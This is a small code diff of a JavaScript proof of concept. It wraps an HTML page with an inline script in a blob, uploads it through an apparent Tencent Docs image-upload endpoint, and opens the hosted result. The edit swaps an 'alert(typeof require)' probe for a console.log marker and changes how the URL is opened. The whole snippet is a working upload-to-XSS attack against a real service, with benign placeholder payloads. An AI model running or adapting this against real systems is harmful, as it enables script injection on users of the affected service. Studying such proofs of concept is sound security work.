@@ -1,4 +1,4 @@
-var html = '<html><body><script>alert(typeof require)</script></body></html>';
+var html = '<html><body><script>console.log(666)</script></body></html>';
 var blob = new Blob([html], {
     type: 'text/html'
 });
@@ -12,7 +12,7 @@ fetch('https://docs.qq.com/api/docsdata/image/upload?globalPadId=550e8400-e29b-4
 }).then(function (r) {
     return r.text()
 }).then(function (d) {
-    var xx = JSON.parse(d);location.href = xx.url;
+    var xx = JSON.parse(d);window.open(xx.url);
 }).catch(function (e) {
     console.log('UPLOAD ERROR:', e)
 });
